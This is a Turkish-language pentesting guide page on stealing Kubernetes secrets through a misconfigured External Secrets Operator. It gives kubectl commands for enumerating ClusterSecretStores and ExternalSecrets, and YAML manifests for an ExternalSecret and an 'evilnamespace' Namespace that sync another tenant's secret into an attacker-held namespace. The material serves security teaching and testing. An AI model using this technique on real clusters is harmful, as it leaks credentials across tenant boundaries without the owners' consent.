# External Secret Operator

**Bu sayfanın orijinal yazarı** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Bu sayfa, yanlış yapılandırılmış bir ESO veya ESO'yu kullanarak gizli bilgilerini senkronize eden bir uygulamadan gizli bilgileri nasıl çalabileceğinize dair bazı ipuçları vermektedir.

## Disclaimer

Aşağıda gösterilen teknik yalnızca belirli koşullar sağlandığında çalışabilir. Örneğin, bir gizli bilginin sahip olduğunuz / ele geçirdiğiniz bir ad alanında senkronize edilmesine izin veren gereksinimlere bağlıdır. Bunu kendiniz çözmeniz gerekiyor.

## Prerequisites

1. Bir kubernetes / openshift kümesinde bir ad alanında yönetici ayrıcalıkları ile bir yer edinme
2. Küme düzeyinde en azından ExternalSecret üzerinde okuma erişimi
3. ESO'nun gizli bilginizi senkronize etmesine izin veren gerekli etiketler / açıklamalar veya grup üyeliği olup olmadığını belirleyin. Şanslıysanız, tanımlı herhangi bir gizli bilgiyi özgürce çalabilirsiniz.

### Mevcut ClusterSecretStore hakkında bilgi toplama

Bu kaynağı okumak için yeterli haklara sahip bir kullanıcıya sahip olduğunuzu varsayarak; önce mevcut _**ClusterSecretStores**_ listesini çıkararak başlayın.
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret enumeration

Bir _**mystore**_ adlı ClusterSecretStore bulduğunuzu varsayalım. İlgili externalsecret'leri listelemeye devam edin.
```sh
kubectl get externalsecret -A | grep mystore
```
_Bu kaynak ad alanı kapsamlıdır, bu nedenle hangi ad alanında arama yapacağınızı bilmiyorsanız, tüm ad alanlarında arama yapmak için -A seçeneğini ekleyin._

Tanımlı externalsecret'lerin bir listesini almalısınız. _**mysecret**_ adında bir externalsecret nesnesi bulduğunuzu varsayalım ve bu nesne _**mynamespace**_ ad alanında tanımlanmış ve kullanılıyor. Hangi türde bir gizli bilgi tuttuğu hakkında biraz daha bilgi toplayın.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Parçaları Birleştirme

Buradan bir veya birden fazla gizli adın (Secret kaynağında tanımlandığı gibi) adını alabilirsiniz. Çıktınız şu şekilde olacaktır:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Şu ana kadar şunları aldık:

- Bir ClusterSecretStore adı
- Bir ExternalSecret adı
- Sırrın adı

Artık ihtiyacımız olan her şeye sahip olduğumuza göre, bir ExternalSecret oluşturabilirsiniz (ve nihayetinde yeni sırrınızın senkronize edilmesi için gereken ön koşullara uymak üzere yeni bir Namespace oluşturabilir/patchleyebilirsiniz):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Birkaç dakika sonra, senkronizasyon koşulları sağlandıysa, ad alanınız içinde sızdırılan sırrı görebilmelisiniz.
```sh
kubectl get secret leaked_secret -o yaml
```
## Referanslar

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
